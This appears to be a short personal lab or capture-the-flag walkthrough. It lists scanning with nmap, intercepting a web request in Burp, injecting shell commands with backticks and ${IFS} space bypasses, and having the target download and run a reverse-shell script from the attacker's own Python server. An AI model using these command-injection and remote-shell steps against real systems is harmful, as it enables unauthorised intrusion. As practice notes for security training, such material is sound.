nmap
then visited website
tested input space
the intercepted with burpe and sent it to repeater
in repeater modified the result url with back ticks= `ping${IFS}127.0.0.1`
got reverse shell 1 line and put it in rev.sh
opened a python3 server in transfer directory
wget in burpe my server for rev
sent chmod$ {IFS}777${IFS}rev.sh
send bash ${IFS}rev.sh   #it didnt like the ./ so bash replaced it
